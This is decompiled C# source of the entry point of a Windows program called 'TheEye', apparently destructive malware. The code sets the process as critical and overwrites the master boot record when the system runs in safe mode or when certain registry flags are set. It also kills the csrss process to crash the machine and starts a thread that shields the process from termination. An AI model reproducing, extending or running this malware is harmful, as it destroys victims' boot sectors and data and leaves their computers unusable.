// Decompiled with JetBrains decompiler
// Type: TheEye.Program
// Assembly: TheEye, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1F112655-6C2B-4871-B1D6-7F6EA80D9DFB
// Assembly location: R:\WinBackup\Downloads\TheEye (Beta) [c0d9d by DesConnet](1)\src\Resources\theeye.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace TheEye
{
  internal static class Program
  {
    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(uint smIndex);

    [STAThread]
    private static void Main()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.ThreadException += new ThreadExceptionEventHandler(Program.ExceptionErr);
      using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
      {
        if (subKey.GetValue("WarnEULA") != null)
        {
          if ((int) subKey.GetValue("WarnEULA") == 1)
            goto label_7;
        }
        int num = (int) MessageBox.Show("You're a bad man...", "TheEye");
        Vars.FatalError = true;
        throw new Exception("You try to run me around...");
      }
label_7:
      Functions.SetProcessIsCritical(1);
      if (Program.GetSystemMetrics(67U) == 1 || Program.GetSystemMetrics(67U) == 2)
      {
        DestructionPayloads.OverwriteMBR(Vars.BrokeTheRulesMBR, false);
        using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
        {
          subKey.SetValue("TryToTurnOffPC", (object) 0);
          subKey.SetValue("TheEnd", (object) 1);
          subKey.Close();
        }
        int num = (int) MessageBox.Show("Why... You entered safe mode?", "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        Process.GetProcessesByName("csrss")[0].Kill();
      }
      using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
      {
        if (subKey.GetValue("TheEnd") != null)
        {
          if ((int) subKey.GetValue("TheEnd") == 1)
            DestructionPayloads.OverwriteMBR(Vars.BrokeTheRulesMBR, true);
        }
      }
      using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
      {
        if (subKey.GetValue("TryToTurnOffPC") != null)
        {
          if ((int) subKey.GetValue("TryToTurnOffPC") == 1)
            DestructionPayloads.OverwriteMBR(Vars.NormalMBR, true);
        }
      }
      new Thread((ThreadStart) (() => Functions.ProcessShield("windef"))).Start();
      Application.Run((Form) new Form1());
    }

    private static void ExceptionErr(object sender, ThreadExceptionEventArgs e)
    {
      int num = (int) MessageBox.Show("An error has occurred: " + e.Exception.ToString(), "TheEye (by DesConnet)", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      if (!Vars.FatalError)
        return;
      Environment.Exit(1);
    }
  }
}
